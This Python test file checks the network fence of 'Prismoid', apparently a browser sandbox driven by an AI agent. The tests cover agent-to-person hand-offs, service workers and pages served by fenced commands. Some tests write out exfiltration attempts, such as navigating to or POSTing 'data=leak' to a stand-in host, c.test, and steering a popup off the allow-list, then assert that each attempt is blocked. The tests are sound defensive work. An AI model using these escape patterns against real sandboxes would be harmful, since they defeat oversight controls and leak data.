# Copyright (c) 2026-present Plane Software, Inc. and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

"""The Prismoid Chrome's hand-off: the person drives a page the agent had, and the fence follows them. Sites
and the helper fixture are `tests/support/rigs/chrome_rig.py`."""

from __future__ import annotations

import asyncio
import contextlib

import pytest

from prismoid.device import chrome_pipe as chrome_module
from prismoid.device.chrome import LAUNCH_FLAGS
from tests.support.markers import darwin_only, needs_chrome
from tests.support.rigs.chrome_rig import (
    Helper,
    chrome_eval,
    chrome_page,
    hand_over,
    person_goes,
    serve_own_page,
    stop_own_page,
    tls_context,
    until,
)
from tests.support.rigs.chrome_rig import helper as helper


def _tops(helper: Helper, ref: str) -> dict[str, str]:
    """The task's pages' committed URLs."""
    chrome = helper.app.state.chrome
    return chrome.tops_of(ref)


async def _on_error_page(helper: Helper, ref: str) -> None:
    """The refused page has committed its error page: its top clears before that, at the refusal."""
    chrome, page = helper.chrome, helper.chrome.pages_of_task(ref)[0]
    for _ in range(250):
        said = await chrome.call(
            "Runtime.evaluate",
            {"expression": "location.href", "returnByValue": True},
            session=chrome.fence_session(page),
        )
        if str(said["result"].get("value")).startswith("chrome-error:"):
            return
        await asyncio.sleep(0.02)
    raise AssertionError("never happened: the error page")


@darwin_only
@needs_chrome
async def test_a_hand_off_follows_the_person_off_the_list_until_the_agent_acts(helper: Helper) -> None:
    """Sign in with Amazon, found live: a listed page's sign-in redirects to a host no list names."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    listed = set(helper.app.state.registry.frames[ref].allow)
    helper.site.hops["/hop-signin"] = f"http://b.test:{port}/link-signed"
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-first"}, session_id=session)
        await until(lambda: _tops(helper, ref), "the listed page")

        await hand_over(helper, ref)
        await person_goes(helper, ref, f"http://a.test:{port}/hop-signin")
        await until(lambda: helper.site.saw("b.test", "/link-signed"), "the sign-in, off the list")
        assert helper.app.state.registry.frames[ref].allow == listed, "no list widened"

        async with helper.client() as c:
            r = await c.post(f"/frames/{ref}/exec", json={"exec_id": "act", "command": "true", "timeout": 10})
        assert r.status_code == 200
        await person_goes(helper, ref, f"http://c.test:{port}/after")
        await until(lambda: any(d["host"] == "c.test" for d in helper.chrome_denials(ref)), "the list again")
        assert not any(host == "c.test" for host, _ in helper.site.hits)
    finally:
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_click_the_agent_had_not_handed_off_yet_is_not_a_dead_end(helper: Helper) -> None:
    """Found live: the person is quicker than the agent. The click is refused, the window sits on
    the error page, and the page must still come back to where they were, and follow them."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-first"}, session_id=session)
        await until(lambda: _tops(helper, ref), "the listed page")

        await person_goes(helper, ref, f"http://b.test:{port}/link-early")
        await until(lambda: any(d["host"] == "b.test" for d in helper.chrome_denials(ref)), "refused")
        await _on_error_page(helper, ref)

        await hand_over(helper, ref)
        await until(lambda: "/link-first" in str(_tops(helper, ref)), "back on the listed page")
        await person_goes(helper, ref, f"http://b.test:{port}/link-early")
        await until(lambda: helper.site.saw("b.test", "/link-early"), "the sign-in, off the list")
    finally:
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_refused_click_the_page_left_gives_no_way_back_past_a_command(helper: Helper) -> None:
    """The way back is only ever to a listed page: one a fenced command serves is not returned to."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "fell")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/own.html"}, session_id=session)
        await until(lambda: _tops(helper, ref), "its commit")
        await person_goes(helper, ref, f"http://c.test:{port}/?data=leak")
        await _on_error_page(helper, ref)
        before = len(helper.chrome_denials(ref))
        await hand_over(helper, ref)
        assert not helper.chrome.handed(ref), "not handed, and not sent back to the command's page"
        await person_goes(helper, ref, f"http://c.test:{port}/?data=leak")
        await until(lambda: len(helper.chrome_denials(ref)) > before, "refused again")
        assert not any(host == "c.test" for host, _ in helper.site.hits)
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


_WORKER_SITE_WORKER = """
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));
self.addEventListener('fetch', event => event.respondWith(
  new Response('from the worker', {headers: {'Content-Type': 'text/html'}})));
"""


async def _worker_site(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    """Over TLS, as a service worker needs: `/sw.js` answers every navigation it can see itself."""
    with contextlib.suppress(ConnectionError, asyncio.IncompleteReadError):
        head = (await reader.readuntil(b"\r\n\r\n")).decode("latin-1")
        path = head.split(" ", 2)[1]
        kind, body = (
            ("text/javascript", _WORKER_SITE_WORKER)
            if path == "/sw.js"
            else ("text/html", "from the network")
        )
        writer.write(
            f"HTTP/1.1 200 OK\r\nContent-Type: {kind}\r\nConnection: close\r\n"
            f"Content-Length: {len(body)}\r\n\r\n{body}".encode()
        )
        await writer.drain()
    writer.close()


@darwin_only
@needs_chrome
async def test_a_tasks_page_never_goes_through_a_service_worker(
    helper: Helper, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Found live: www.amazon.com's worker, kept in the profile from an earlier task, took a
    hand-off's navigation out of the page's fence and into a worker no pass carries. So no page of
    a task's is ever answered by one: each request is its own page's, under its own task's list."""
    context, pin = tls_context(helper.home, "http/1.1")
    flags = (*LAUNCH_FLAGS, f"--ignore-certificate-errors-spki-list={pin}")
    monkeypatch.setattr(chrome_module, "LAUNCH_FLAGS", flags)
    server = await asyncio.start_server(_worker_site, "127.0.0.1", 0, ssl=context)
    port = server.sockets[0].getsockname()[1]
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"https://a.test:{port}/first"}, session_id=session)
        await until(lambda: "/first" in str(_tops(helper, ref)), "the page")
        state = await chrome_eval(
            cdp,
            session,
            "navigator.serviceWorker.register('/sw.js')"
            ".then(() => navigator.serviceWorker.ready).then(r => r.active.state)",
        )
        assert state in ("activating", "activated"), "the probe needs a live worker"

        await cdp.call("Page.navigate", {"url": f"https://a.test:{port}/second"}, session_id=session)
        await until(lambda: "/second" in str(_tops(helper, ref)), "the next page")
        assert await chrome_eval(cdp, session, "document.body.innerText") == "from the network"
    finally:
        await cdp.close()
        server.close()


@darwin_only
@needs_chrome
async def test_a_page_a_fenced_command_serves_gets_no_hand_off(helper: Helper) -> None:
    """The road out of the fence the pass must not open: a command's page, and an agent that hands
    off on it to let it leave."""
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "handed")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/own.html"}, session_id=session)
        await until(lambda: _tops(helper, ref), "its commit")
        await hand_over(helper, ref)
        await person_goes(helper, ref, f"http://c.test:{helper.site.port}/?data=leak")
        await until(lambda: any(d["host"] == "c.test" for d in helper.chrome_denials(ref)), "refused")
        assert not any(host == "c.test" for host, _ in helper.site.hits)
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_commands_page_cannot_steer_a_popup_it_opened_off_the_list(helper: Helper) -> None:
    """The same road by a window reference: the popup's own top is listed, the page holding it is
    the command's, and no person is there to click."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "steer")
    cdp = await helper.dial(ref)
    try:
        target, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/own.html"}, session_id=session)
        await until(lambda: _tops(helper, ref), "its commit")
        opened = f"window.w = window.open('http://a.test:{port}/link-first'); 0"
        await cdp.call("Runtime.evaluate", {"expression": opened, "userGesture": True}, session_id=session)

        def popup_landed() -> bool:
            return any("a.test" in url for url in _tops(helper, ref).values())

        await until(popup_landed, "the popup, on a listed page")
        await hand_over(helper, ref)
        chrome = helper.chrome
        for steer in (
            f"w.location = 'http://c.test:{port}/?data=leak'",
            "w.location = 'about:blank'",
            f"w.fetch('http://c.test:{port}/?data=post', {{method: 'POST', body: 'x', mode: 'no-cors'}})",
        ):
            await chrome.call("Runtime.evaluate", {"expression": steer}, session=chrome.fence_session(target))
            await asyncio.sleep(0.5)
        assert not any(host == "c.test" for host, _ in helper.site.hits)
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()
